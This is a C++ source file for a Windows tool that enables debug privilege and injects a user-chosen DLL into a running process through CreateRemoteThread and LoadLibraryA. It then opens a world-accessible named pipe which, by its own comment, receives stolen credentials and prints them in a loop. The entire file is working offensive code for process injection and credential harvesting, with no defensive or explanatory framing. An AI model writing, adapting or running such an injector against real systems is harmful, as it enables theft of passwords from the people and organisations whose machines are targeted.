#include <stdio.h>
#include <windows.h>
#include <string>

#define USAGE_COUNT 3

using namespace std;

// Enable debug privilege
BOOL EnableDebugPrivilege()
{
  HANDLE hToken;
  LUID sede;
  TOKEN_PRIVILEGES tkp;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
  {
    return FALSE;
  }

  if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sede))
  {
    CloseHandle(hToken);
    return FALSE;
  }

  tkp.PrivilegeCount = 1;
  tkp.Privileges[0].Luid = sede;
  tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
  {
    CloseHandle(hToken);
    return FALSE;
  }

  CloseHandle(hToken);
  return TRUE;
}

bool injectDLL(int pid, string path)
{
  HANDLE pHandle;
  LPVOID kernel32;
  LPVOID loadLibraryPtr;
  LPVOID alloc;
  SIZE_T bytesWritten;

  pHandle = ::OpenProcess(PROCESS_ALL_ACCESS, false, pid);
  if (pHandle == INVALID_HANDLE_VALUE)
  {
    return FALSE;
  }

  kernel32 = LoadLibrary("kernel32.dll");
  if (kernel32 == NULL)
  {
    return FALSE;
  }

  loadLibraryPtr = (LPVOID)GetProcAddress((HMODULE)kernel32, "LoadLibraryA");
  if (loadLibraryPtr == NULL) {
    return FALSE;
  }

  printf("[*] Injecting %d bytes\n", path.size() + 1);
  alloc = VirtualAllocEx(pHandle, 0, path.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (alloc == NULL) {
    return FALSE;
  }

  if (WriteProcessMemory(pHandle, alloc, path.c_str(), path.size() + 1, &bytesWritten) == 0) {
    return FALSE;
  }

  printf("[*] Written %d bytes\n", bytesWritten);
  printf("[*] Starting new thread at %p\n", loadLibraryPtr);

  if (CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryPtr, alloc, 0, NULL) == NULL) {
    return FALSE;
  }

  return TRUE;
}

int main(int argc, char **argv)
{
  HANDLE pipeHandle;
  char buffer[1024];
  DWORD bytesRead;
  PSECURITY_DESCRIPTOR pSD;
  SECURITY_ATTRIBUTES sa;

  if (argc != USAGE_COUNT)
  {
    printf("Usage: %s PID DLL_PATH\n", argv[0]);
    return 2;
  }

  if (!EnableDebugPrivilege()) {
    printf("[!] Could not enable debug privilege\n");
  }

  pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
  if (!pSD)
  {
    printf("[!] Could not alloc SECURITY_DESCRIPTOR\n");
    return 3;
  }

  if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
  {
    printf("[!] Could not Init SECURITY_DESCRIPTOR\n");
    return 3;
  }

  if (!SetSecurityDescriptorDacl(pSD, TRUE, NULL, FALSE))
  {
    printf("[!] Could not set SECURITY_DESCRIPTOR\n");
    return 3;
  }

  sa.nLength = sizeof(sa);
  sa.lpSecurityDescriptor = pSD;
  sa.bInheritHandle = FALSE;

  // Create named pipe to retrieve credentials
  pipeHandle = CreateNamedPipeA("\\\\.\\pipe\\adpipe",
                                PIPE_ACCESS_DUPLEX,
                                PIPE_TYPE_MESSAGE | 
                                PIPE_READMODE_MESSAGE | 
                                PIPE_WAIT,
                                PIPE_UNLIMITED_INSTANCES,
                                1024,
                                1024,
                                0,
                                &sa);

  if (!injectDLL(atoi(argv[1]), string(argv[2]))) {
    printf("[!] Injection failed\n");
    return 2;
  }

  printf("[*] DLL Injected\n");

  ConnectNamedPipe(pipeHandle, NULL);

  while (1) {
    ReadFile(pipeHandle, buffer, sizeof(buffer), &bytesRead, NULL);
    wprintf(L"[*] Received: %ls\n", (WCHAR *)buffer);
  }
}